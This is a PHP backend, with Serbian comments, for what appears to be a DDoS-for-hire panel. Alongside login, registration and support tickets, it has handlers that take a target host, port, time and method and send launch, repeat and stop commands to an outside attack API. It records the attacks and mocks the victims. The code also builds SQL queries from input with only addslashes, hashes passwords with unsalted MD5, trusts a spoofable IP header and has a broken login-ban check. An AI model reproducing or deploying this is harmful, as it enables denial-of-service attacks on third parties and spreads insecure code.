<?php
ob_start(); 
session_start();
error_reporting(0);

include_once ("connect_db.php");

date_default_timezone_set('Europe/Belgrade');

// FUNKCIJE //

// Stranice

if (!isset($_GET['task']) && $_GET['task'] == "") {
		
	header("Location: /home");
	
	$_SESSION['error'] = "Ova stranica ne postoji!";
}

if (isset($_GET['task']) && $_GET['task'] == "homePage") {
		
	header("Location: /home");
		
}

if (isset($_GET['task']) && $_GET['task'] == "logout") {
	
	session_start();

	if(session_destroy()) {
		
		session_unset();
		session_destroy();
	}

	session_start();

	$_SESSION['ok'] = "Dovidjenja, dodjite nam opet! :)";

	header("Location: /home");

	die();
}

if (isset($_GET['task']) && $_GET['task'] == "podrska") {
	
	$_SESSION['ok'] = "Support je tu za vas 24/7!";

	header("Location: /podrska");
		
}

if (isset($_GET['task']) && $_GET['task'] == "open_ticket") {

	$_SESSION['info'] = "Opisite vas problem detaljno kako bi vam brze i bolje pomogli!";
		
	header("Location: /open_ticket");
		
}

if (isset($_GET['task']) && $_GET['task'] == "my_ticket") {

	$_SESSION['info'] = "Lista vasih tiketa";
		
	header("Location: /my_ticket");
		
}

if (isset($_GET['task']) && $_GET['task'] == "naruci") {
		
	header("Location: /buy_packet"); // Trenutno u izradi
		
}

// Clijent Register

if (isset($_GET['task']) && $_GET['task'] == "register") {
	$username = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['username'])));
	$password = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['password'])));
	$email = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['email'])));
	$ime = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['ime'])));
	$prezime = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['prezime'])));
	$drzava = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['drzava'])));
	$sig = htmlspecialchars(mysql_real_escape_string(addslashes($_SESSION["code"])));
	$sigkod = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['sigkod'])));
	$datum = date('d.m.Y');
	
	$time1 = time();
	$user_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	
    if(strlen($username) > 20 || strlen($username) < 4){
        $_SESSION['error'] = "Vase korisnicko ime je prekratko!";
		header("location: /home");
        die();
    }
		
	if($username == ""||$password == ""||$ime == ""||$prezime == ""||$email == ""||$drzava == ""||$sigkod == ""){
		$_SESSION['error'] = "Sva polja moraju biti popunjena!";
		header("location: /home");
		die();
	}
 
	$kveri = mysql_query("SELECT * FROM users WHERE username='$username'");
	if (mysql_num_rows($kveri)>0) {
	    $_SESSION['error'] = "Ovaj username je vec registrovan u nasoj bazi!";
		header("Location: /home");
		die();
	}

	$kveri = mysql_query("SELECT * FROM users WHERE email='$email'");
	if (mysql_num_rows($kveri)>0) {
		$_SESSION['error'] = "Ovaj mail je vec registrovan u nasoj bazi!";
		header("Location: /home");
		die();
	}

	if($sigkod == $sig) {
		if ($password == $password){
			$cpass = md5($password);
			$sql = "INSERT INTO users (username,ime,prezime,password,email,register_time,user_ip,datum,drzava,rank_status) VALUES ('$username','$ime','$prezime','$cpass','$email','$time1','$user_ip','$datum','$drzava','korisnik')";
			mysql_query($sql);
			$_SESSION['ok'] = "Uspesno ste se registrovali!";
			
			$info_ = mysql_fetch_array(mysql_query("SELECT * FROM users ORDER by userid DESC LIMIT 1"));
			$pid = $info_['userid'];
			
			header("Location: /home");
		} else {
			$_SESSION['error'] = "Neuspesna registracija, proverite dali ste dobro uneli sve podatke!";
			header("Location: /home");
			die();
		}
	
	} else {
		$_SESSION['error'] = "Sigurnosni kod nije tacan!";
		header("location: /home");
		die();
	}
}

// Clijent Login

if (isset($_GET['task']) && $_GET['task'] == "login") {

	$user_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	$loc_ip = json_decode(file_get_contents("http://ipinfo.io/$user_ip/json/"));

	$l_h_p = mysql_num_rows(mysql_query("SELECT id FROM greske WHERE login_pokusaj='login_haker' AND ip='$loc_ip->ip'"));
	
	if ($l_h_p -= 7) {

		$username = addslashes($_POST['username']);
		$password = addslashes($_POST['password']);
		$cpass = md5($password);
		$kveri = mysql_query("SELECT * FROM users WHERE username='$username' AND password='$cpass'");

		if (mysql_num_rows($kveri)) {

			$user = mysql_fetch_array($kveri);
			$_SESSION['userid'] = $user['userid'];
			$_SESSION['username'] = $user['username'];
			$_SESSION['ime'] = $user['ime'];
			$_SESSION['prezime'] = $user['prezime'];
			$_SESSION['avatar'] = $user['avatar'];
			$_SESSION['rank'] = $user['rank'];
			$mesec = 24*60*60*31; // mesec dana
			
			$user_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
			$loc_ip = json_decode(file_get_contents("http://ipinfo.io/$user_ip/json/"));
			$time = time();
			
			$sesija = md5($user['username'] . $cpass . $user['ime'] . $user['prezime'] . $_SERVER['HTTP_X_FORWARDED_FOR'] . time());

			setcookie("userid", $_SESSION['userid'], time()+ $mesec);

			setcookie("_u_name", $_SESSION['username'], time()+ $mesec);
			setcookie("_i_p", $_SESSION['ime'] .' '.$_SESSION['prezime'], time()+ $mesec);
			setcookie("_r", $_SESSION['rank'], time()+ $mesec);
			setcookie("sesija", $sesija, time() + $mesec);

			mysql_query("UPDATE users SET user_ip='$loc_ip->ip' WHERE userid='$_SESSION[userid]'");
			mysql_query("UPDATE users SET drzava='$loc_ip->country' WHERE userid='$_SESSION[userid]'");

			if ($kveri['save_drzava'] == "") {
				mysql_query("UPDATE users SET save_drzava='$loc_ip->country' WHERE userid='$_SESSION[userid]'");
			}
	        
	        $_SESSION['ok'] = "Uspesno ste se ulogovali!";
			header("Location: /home");
		} else {

			$user_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
			$loc_ip = json_decode(file_get_contents("https://ipapi.co/$user_ip/json/"));

			mysql_query("INSERT into greske(id,login_pokusaj,userid,ip) VALUES(NULL,'login_haker','$_SESSION[userid]','$loc_ip->ip')");

			header("Location: /home");

			die();
		}
			
	} else {

		$_SESSION['error'] = "Zbog vise netacnih unosa podataka za logiranje ste privremeno banovani, cekajte da Administrator odobri vase ponovno logovanje!";
		header("location: /home");

		die();

	}
}

// DDosaj govedo

if (isset($_GET['task']) && $_GET['task'] == "dosajPicku") {

	if ($_SESSION['userid'] == "") {
		
		$_SESSION['error'] = "Postovani, vi nemate validan nalog!";
		header("Location: /home");		
		die();

	} else {

		$host = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['host'])));
		$port = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['port'])));
		$time = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['time'])));
		$method = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['method'])));

		$ddos_posalji = file_get_contents("http://api.defconpro.io/api.php?ip=$host&port=$port&time=$time&method=$method&key=$defconPass");

		if (!$ddos_posalji) {
			
			$_SESSION['error'] = "Neuspesno slanje ddos napada na ip: $host !";
			header("Location: /home");
			die();
		
		} else {

			if($host == ""||$port == ""||$time == ""||$method == ""){
				$_SESSION['error'] = "Sva polja moraju biti popunjena!";
				header("location: /home");
				die();
			}

			if(strlen($host) < 9) {
		        $_SESSION['error'] = "IP mora biti veci od devet karaktera.";
				header("location: /home");
		        die();
	    	}

			$user_ip = $_SERVER['REMOTE_ADDR'];

			$sql = "INSERT into atack(id,userid,ip,port,time,method,vreme,status,cip) VALUES(NULL,'$_SESSION[userid]','$host','$port','$time','$method','0','1','$user_ip')";

			mysql_query($sql);

			$_SESSION['ok'] = "Sada uzivajte gledajuci kako picka puca!";
			header("Location: /home");
			die();
			
		}

	}

}

// Ponovi DDos

if (isset($_GET['task']) && $_GET['task'] == "ponoviDDos") {

	if ($_SESSION['userid'] == "") {
		
		$_SESSION['error'] = "Postovani, vi nemate validan nalog!";
		header("Location: /home");		
		die();

	} else {

		$renewid = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['renewid'])));
		$userid = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['userid'])));

		if($renewid == "") {
			$_SESSION['error'] = "Sta pokusavas?!";
			header("location: /home");
			die();
		}

		if ($userid == $_SESSION['userid']) {

			$host = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['host'])));
			$port = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['port'])));
			$time = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['time'])));
			$method = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['method'])));

			$smilujSe = file_get_contents("http://api.defconpro.io/api.php?ip=$host&port=$port&time=$time&method=$method&key=$defconPass");
			
			if (!$smilujSe) {
			
				$_SESSION['error'] = "Neuspesno stopiranje proslog ddos napada na ip: $host !";
				header("Location: /home");
				die();
			
			} else {

				$user_ip = $_SERVER['REMOTE_ADDR'];

				$sql = "UPDATE atack SET status='1' WHERE id='$renewid'";

				mysql_query($sql);

				$_SESSION['ok'] = "Uspesno ste ponovili ddos napad na ip: $host!";
				
				header("Location: /atack/$renewid");
				die();
			}

		} else {

			$_SESSION['error'] = "Sta pokusavas?!";
			header("Location: /home");
			die();

		}

	}

}

// Stopiraj DDosaj, sazali se na govedo

if (isset($_GET['task']) && $_GET['task'] == "sazaliSe") {

	if ($_SESSION['userid'] == "") {
		
		$_SESSION['error'] = "Postovani, vi nemate validan nalog!";
		header("Location: /home");		
		die();

	} else {

		$stopid = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['stopid'])));
		$userid = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['userid'])));

		if($stopid == "") {
			$_SESSION['error'] = "Sta pokusavas?!";
			header("location: /home");
			die();
		}

		if ($userid == $_SESSION['userid']) {

			$host = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['host'])));
			$port = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['port'])));
			$time = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['time'])));

			$smilujSe = file_get_contents("http://api.defconpro.io/api.php?ip=$host&port=$port&time=$time&method=STOP&key=$defconPass");
			
			if (!$smilujSe) {
			
				$_SESSION['error'] = "Neuspesno stopiranje proslog ddos napada na ip: $host !";
				header("Location: /home");
				die();
			
			} else {

				$user_ip = $_SERVER['REMOTE_ADDR'];

				$sql = "UPDATE atack SET status='0' WHERE id='$stopid'";

				mysql_query($sql);

				$_SESSION['ok'] = "Uspesno ste stopirali ddos napad!";
				
				header("Location: /atack/$stopid");
				die();
			}

		} else {

			$_SESSION['error'] = "Sta pokusavas?!";
			header("Location: /home");
			die();

		}

	}

}

// Otvori tiket

if (isset($_GET['task']) && $_GET['task'] == "add_ticket") {

	if ($_SESSION['userid'] == "") {
		
		$_SESSION['error'] = "Postovani, vi nemate validan nalog!";
		header("Location: /home");		
		die();

	} else {

		$naslov = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['naslov'])));
		$vrstaTiketa = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['vrstaTiketa'])));
		$prioritet = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['prioritet'])));
		$opisProblema = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['opisProblema'])));
		$sig = htmlspecialchars(mysql_real_escape_string(addslashes($_SESSION["code"])));
		$sigkod = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['sigkod'])));
		$datum = date('d.m.Y');
		
		$time1 = time();
		$user_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
			
		if($naslov == ""||$vrstaTiketa == ""||$prioritet == ""||$opisProblema == ""||$sig == ""||$sigkod == ""){
			$_SESSION['error'] = "Sva polja moraju biti popunjena!";
			header("location: /home");
			die();
		}
		
		if($sigkod == $sig) {
				
			$sql = "INSERT INTO tiketi (id,userid,naslov,sadrzaj,datum,vreme,status,odgovor) 
			VALUES(NULL,'$_SESSION[userid]','$naslov','$opisProblema','$datum','$time1','1','0')";
			mysql_query($sql);
			
			$_SESSION['ok'] = "Uspesno ste otvorili tiket, sacekajte da vam support odgovori!";
			
			header("Location: /home");
		
		} else {
			$_SESSION['error'] = "Sigurnosni kod nije tacan!";
			header("location: /home");
			die();
		}

	}

}

// klijent dodaj odgovor na tiket

if (isset($_GET['task']) && $_GET['task'] == "add_ticket_odgovor") {

	if ($_SESSION['userid'] == "") {
		
		$_SESSION['error'] = "Postovani, vi nemate validan nalog!";
		header("Location: /home");		
		die();

	} else {

		$add_odg_na_tiket = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['add_odg_na_tiket'])));
		$tiketid = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['tiketid'])));
		$sig = htmlspecialchars(mysql_real_escape_string(addslashes($_SESSION["code"])));
		$sigkod = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['sigkod'])));
		$datum = date('d.m.Y');
		
		$time1 = time();
		$user_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
			
		if($add_odg_na_tiket == ""||$tiketid == ""||$sig == ""||$sigkod == ""){
			$_SESSION['error'] = "Sva polja moraju biti popunjena!";
			header("location: /tiket/$tiketid");
			die();
		}
		
		if($sigkod == $sig) {
				
			$sql = "INSERT INTO tiketi_odgovori (id,tiketid,userid,odgovor) VALUES(NULL,'$tiketid','$_SESSION[userid]','$add_odg_na_tiket')";
			mysql_query($sql);
			
			$_SESSION['ok'] = "Uspesno ste otvorili tiket, sacekajte da vam support odgovori!";
			
			header("Location: /tiket/$tiketid");
			die();
		
		} else {
			$_SESSION['error'] = "Sigurnosni kod nije tacan!";
			header("location: /tiket/$tiketid");
			die();
		}

	}

}

?>